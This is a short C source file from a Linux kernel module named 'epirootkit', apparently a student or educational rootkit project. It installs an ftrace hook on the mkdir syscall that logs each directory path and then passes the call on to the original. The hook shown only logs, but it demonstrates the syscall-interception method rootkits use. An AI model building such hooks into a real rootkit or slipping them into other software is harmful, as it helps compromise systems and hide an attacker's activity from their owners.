#include "epirootkit.h"

// Global variable to store the original mkdir syscall address.
unsigned long __orig_mkdir = 0;

/**
 * @brief Hook function for the mkdir syscall.
 *
 * @param pathname User-space pointer to the directory path.
 * @param mode Permissions mode for the new directory.
 * @return Return value from the original mkdir syscall.
 */
asmlinkage int mkdir_hook(const char __user *pathname, int mode)
{
    char kpath[256];
    int copied, ret;

    copied = strncpy_from_user(kpath, pathname, sizeof(kpath));
    if (copied > 0) printk(KERN_INFO "my_mkdir_hook: mkdir called with path: %s, mode: %o\n", kpath, mode);
    else printk(KERN_INFO "my_mkdir_hook: mkdir called (failed to copy pathname)\n");

    ret = ((int (*)(const char __user *, int))__orig_mkdir)(pathname, mode);
    return ret;
}

// Number of hooks in the array
size_t hook_array_size = 1; 

// Array of hooks to install.
struct ftrace_hook hooks[] = { 
	HOOK("sys_mkdir", mkdir_hook, &__orig_mkdir) 
};